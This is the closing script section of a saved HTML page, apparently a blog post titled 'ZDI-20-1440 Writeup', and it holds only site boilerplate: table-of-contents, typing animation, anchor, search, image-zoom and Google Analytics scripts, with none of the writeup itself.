      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: 'article.markdown-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="./2021 - ZDI-20-1440 Writeup_files/typed.min.js.下載"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "ZDI-20-1440 Writeup&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script><style type="text/css" data-typed-js-css="true">
        .typed-cursor{
          opacity: 1;
        }
        .typed-cursor.typed-cursor--blink{
          animation: typedjsBlink 0.7s infinite;
          -webkit-animation: typedjsBlink 0.7s infinite;
                  animation: typedjsBlink 0.7s infinite;
        }
        @keyframes typedjsBlink{
          50% { opacity: 0.0; }
        }
        @-webkit-keyframes typedjsBlink{
          0% { opacity: 1; }
          50% { opacity: 0.0; }
          100% { opacity: 1; }
        }
      </style>



  <script src="./2021 - ZDI-20-1440 Writeup_files/anchor.min.js.下載"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="./2021 - ZDI-20-1440 Writeup_files/local-search.js.下載"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="./2021 - ZDI-20-1440 Writeup_files/jquery.fancybox.min.js.下載"></script>
  <link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>

















  

  
    <!-- Google Analytics -->
    <script defer="">
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-150678700-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  

  







</body></html>